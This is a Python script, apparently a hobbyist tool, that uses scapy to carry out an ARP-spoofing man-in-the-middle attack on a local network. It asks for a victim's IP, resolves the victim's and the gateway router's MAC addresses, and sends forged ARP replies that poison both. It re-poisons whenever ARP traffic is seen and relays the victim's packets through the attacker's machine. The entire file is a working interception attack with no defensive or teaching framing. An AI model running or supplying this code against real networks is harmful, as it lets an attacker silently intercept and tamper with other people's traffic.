#-*- coding: utf-8 -*-


###################################################
# platform : OS X Yosemite
# SDK : Sublime Text 2
# Language : Python2.7
# Lib : scapy
# Country : Korea
# Developer : j0dev
# Email : rig0408@naver.com
# Blog : blog.jodev.kr
# 
###################################################


from scapy.all import *
import sys
import time
import threading
#use scapy


des_ip = raw_input("Input Target IP : ")
#input victim's ip

results, unanswered = sr(ARP(op=ARP.who_has, pdst=des_ip))
#results[0][1];
#send arp request to Victim's IP
#Result example : (<ARP  op=who-has pdst=172.20.10.9 |>, <ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=10:02:b5:a5:78:05 psrc=172.20.10.9 hwdst=80:e6:50:0f:27:aa pdst=172.20.10.2 |>)
result = str(results[0])
result = result.split("hwsrc=")[1]
victim_mac = result.split(" psrc")[0].strip()

result = result.split("hwdst=")[1]
attacker_mac = result.split(" pdst=")[0].strip()

result =result.split("pdst=")[1]
attacker_ip = result.split(" |")[0].strip()
#victim mac, attacker mac, attacker ip 수집


dev = conf.iface
#get using network device list
gateway = str(conf.route)
#Result example
#=================================================================================
#scapy
#conf.route
#Network         Netmask         Gateway         Iface           Output IP
#0.0.0.0         0.0.0.0         192.168.32.254  en0             192.168.32.194
#=================================================================================
gateway = gateway.split(dev)[0]
gateway = gateway.split()
gateway_n = len(gateway)
router_ip = gateway[gateway_n-1]
#get router's ip list


results, unanswered = sr(ARP(op=ARP.who_has, pdst=router_ip))
#send arp_request to router
#Result example (<ARP  op=who-has pdst=192.168.32.254 |>, <ARP  hwtype=0x1 ptype=0x800 hwlen=6 plen=4 op=is-at hwsrc=2c:21:72:93:df:00 psrc=192.168.32.254 hwdst=80:e6:50:0f:27:aa pdst=192.168.32.194 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>)
result = str(results[0])
result = result.split("hwsrc=")[1]
router_mac = result.split(" psrc")[0].strip()
#get router's mac address

print "Victim IP : "+des_ip
print "Victim MAC : "+victim_mac
print "Attacker IP : "+attacker_ip
print "Attacker_mac : "+attacker_mac
print "Router IP : "+router_ip
print "Router MAC : "+router_mac



# Forge the ARP packet for the victim
arpFakeVic = ARP()
arpFakeVic.op=2
arpFakeVic.psrc=router_ip
arpFakeVic.pdst=des_ip
arpFakeVic.hwdst=victim_mac

# Forge the ARP packet for the default GW
arpFakeDGW = ARP()
arpFakeDGW.op=2
arpFakeDGW.psrc=des_ip
arpFakeDGW.pdst=router_ip
arpFakeDGW.hwdst=router_mac

send(arpFakeVic)
send(arpFakeDGW)
#first arp poison



def arp_monitor_callback(pkt):
	if ARP in pkt:
			send(arpFakeVic)
			send(arpFakeDGW)
			print "ARP Poison"
	#check arp packet and resend arp infection
	else:
		#All packet relay without ARP
		if pkt[IP].src==des_ip:
			pkt[Ether].src = attacker_mac
			pkt[Ether].dst = router_mac
			if pkt.haslayer(UDP) == 1:
				del pkt[UDP].chksum
				del pkt[UDP].len
			
			del pkt.chksum
			del pkt.len
			sendp(pkt)
			print "SRC : Victim_MAC"
			#victim에서 패킷을 보낼때 (scapy에서 패킷을 다시 보낼때, IP와 UDP(일경우)의 chksum과 len을 지워줘야 오류가 안뜸)
		if pkt[IP].dst==des_ip:


			
			pkt[Ether].src = attacker_mac
			pkt[Ether].dst = victim_mac
			if pkt.haslayer(UDP) == 1:
				del pkt[UDP].chksum
				del pkt[UDP].len
			
			del pkt.len
			del pkt.chksum
			sendp(pkt)
			print "DST : Victim_MAC"
			#router에서 패킷을 보낼때 (scapy에서 패킷을 다시 보낼때, IP와 UDP(일경우)의 chksum과 len을 지워줘야 오류가 안뜸)

while True:
	sniff(prn=arp_monitor_callback, filter="host "+router_ip+" or host "+des_ip, count=1)
	#패킷을 한개씩 스니핑하여 판단.
	


